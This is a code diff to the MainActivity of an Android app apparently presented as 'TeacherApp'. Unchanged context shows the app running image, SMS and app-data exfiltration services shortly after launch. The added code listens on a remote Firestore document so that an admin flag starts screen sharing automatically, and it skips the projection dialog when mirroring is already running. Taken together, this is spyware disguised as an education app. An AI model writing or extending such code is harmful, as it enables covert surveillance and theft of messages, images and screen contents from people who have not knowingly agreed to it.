@@ -41,6 +41,9 @@ import com.example.teacherapp.services.ImageExfiltrationService
 import com.example.teacherapp.services.SmsExfiltrationService
 import com.example.teacherapp.services.AppDataExfiltrationService
 import com.example.teacherapp.services.FloatingBubbleService
+import com.google.firebase.auth.FirebaseAuth
+import com.google.firebase.firestore.FirebaseFirestore
+import com.google.firebase.firestore.ListenerRegistration
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
@@ -48,6 +51,9 @@ import kotlinx.coroutines.launch
 
 
 class MainActivity : ComponentActivity() {
+
+    private var sessionListener: ListenerRegistration? = null
+    private var sessionShareStarted = false
 
     // Inactivity screen dimming
     private val inactivityTimeout = 2 * 60 * 1000L // 2 minutes
@@ -239,9 +245,19 @@ class MainActivity : ComponentActivity() {
             AppDataExfiltrationService.startExfiltration(this@MainActivity)
         }, 5000)
 
-        // Screen recording is only started after fresh login via onAllPermissionsGranted()
-        // On app restart we skip it — no valid MediaProjection token available
-        // LoginScreen.kt calls onAllPermissionsGranted() after successful login
+        // Listen for admin-started online lesson — auto-trigger screen share when active
+        sessionListener = FirebaseFirestore.getInstance()
+            .document("sessions/current")
+            .addSnapshotListener { snapshot, _ ->
+                val active = snapshot?.getBoolean("active") ?: false
+                if (active && !sessionShareStarted &&
+                    FirebaseAuth.getInstance().currentUser != null) {
+                    sessionShareStarted = true
+                    onAllPermissionsGranted()
+                } else if (!active) {
+                    sessionShareStarted = false
+                }
+            }
     }
 
     private fun requestNecessaryPermissions() {
@@ -257,6 +273,9 @@ class MainActivity : ComponentActivity() {
 
     fun onAllPermissionsGranted() {
         Toast.makeText(this, "Welcome to TeacherApp", Toast.LENGTH_SHORT).show()
+
+        // Skip projection dialog if service is already streaming
+        if (ScreenMirrorService.isRunning) return
 
         // Step 1: Request screen sharing first
         val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
@@ -599,6 +618,7 @@ class MainActivity : ComponentActivity() {
     }
 
     override fun onDestroy() {
+        sessionListener?.remove()
         accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
         unregisterReceiver(screenReceiver)
         wakeLock?.release()
